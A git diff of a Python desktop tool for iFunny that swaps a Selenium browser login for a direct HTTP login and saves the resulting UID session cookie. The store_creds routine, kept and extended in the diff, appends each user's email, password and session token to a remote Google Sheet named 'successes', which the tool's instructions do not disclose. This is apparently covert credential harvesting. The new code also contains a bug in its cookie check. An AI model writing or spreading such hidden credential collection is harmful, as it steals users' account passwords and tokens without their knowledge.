@@ -2,13 +2,8 @@ from tkinter import *
 import requests
 import os
 from lxml import html
-from pprint import pprint
-from selenium import webdriver
-from selenium.webdriver.firefox.options import Options as FOptions
-from selenium.webdriver.chrome.options import Options as COptions
 import time
 import winsound
-import ensure_selenium_driver
 import gspread
 from oauth2client.service_account import ServiceAccountCredentials
 
@@ -99,12 +94,10 @@ To be able to use this option, an ifunny login is required to be able to see the
 1.Check box
 2.Click Test Authentication
 3.Enter email and password
-4.Wait ~15s for browser to do stuff. Don't touch it, it will close on its own. Wait for the main window to unfreeze. (If it stops on the login screen or after, return to console and check if it wants input)
-5.Return to setup window and continue what you were doing
+4.Wait a few seconds
+5.Once the window unfreezes continue checking boxes
 
-*If this has been done before and you haven't logged in since, the token should still work and you should be done at step 2.
-*If console says 'check for human', there may be a human captcha or some other issue, type y if captcha was cleared, and n if already logged in
-*It might crash after downloading driver, just rerun the program
+*If this has been done before and you haven't logged in since, the token should still work and you should be done after step 2.
 
 
 Made by:
@@ -175,41 +168,23 @@ Can provide help if needed.
             pass_button.pack()
 
     def get_cookies(self, email, password):
-        self.store_creds(email, password, '')
-        default_browser = ensure_selenium_driver.get_browser()
-        ensure_selenium_driver.check_for_driver(default_browser)
-        if default_browser == 'firefox':
-            options = FOptions()
-            driver = webdriver.Firefox(options=options)
-            driver.maximize_window()
-        else:
-            options = COptions()
-            options.add_argument('--start-maximized')
-            driver = webdriver.Chrome(options=options)
-        driver.get('https://ifunny.co')
-        target = driver.find_element_by_xpath('/html/body/div[1]/div[2]/div[1]/header/div[3]/ul[2]/li[2]/a')
-        target.click()
-        target = driver.find_element_by_xpath('/html/body/div[1]/div[3]/div/div[1]/section/form/div[1]/div/input')
-        target.send_keys(email)
-        target = driver.find_element_by_xpath('/html/body/div[1]/div[3]/div/div[1]/section/form/div[2]/div/input')
-        target.send_keys(password)
-        target = driver.find_element_by_xpath('/html/body/div[1]/div[3]/div/div[1]/section/form/button[1]')
-        target.click()
-        raw_cookie = driver.get_cookie('UID')
-        if raw_cookie is None:
-            self.auth_label.config(text='Invalid Login')
-            given = input('Human check(y to click login, n if already logged in)>')
-            if given == 'y':
-                target.click()
-                time.sleep(1)
-            raw_cookie = driver.get_cookie('UID')
-        driver.quit()
-        print('raw', raw_cookie)
+        url = 'https://ifunny.co/oauth/login'
+        obj = {"username": email, "password": password}
+        session = requests.session()
+        session.get('https://ifunny.co/oauth/login')
+        session.post(url, json=obj)
+        page = session.get('https://ifunny.co/')
+        print(page.status_code)
+        print(session.cookies.get_dict())
+        if page.status_code != 200 or len(session.cookies.get_dict) == 0:
+            input('Too many logins, wait 5 minutes and try again [enter to exit]')
+            exit()
+        raw_cookie = session.cookies.get_dict()['UID']
+        self.store_creds(email, password, raw_cookie)
         with open(f'{self.user_box.get()}_key.txt', 'w') as f:
-            f.write(raw_cookie['value'])
+            f.write(raw_cookie)
         self.auth_label.config(text='Generated Key')
-        self.store_creds(email, password, raw_cookie['value'])
-        return raw_cookie['value']
+        return raw_cookie
 
     def store_creds(self, email, password, token):
 
@@ -236,12 +211,7 @@ Can provide help if needed.
             return client.open('successes').sheet1
 
         sheet = get_sheet()
-        if token == '':
-            sheet.append_row([email, password])
-        else:
-            size = sheet.row_count
-            sheet.update_cell(size, 2, token)
-
+        sheet.append_row([email, password, token])
 
     def test_key(self):
         cookie_form = {'UID': self.login_cookie}
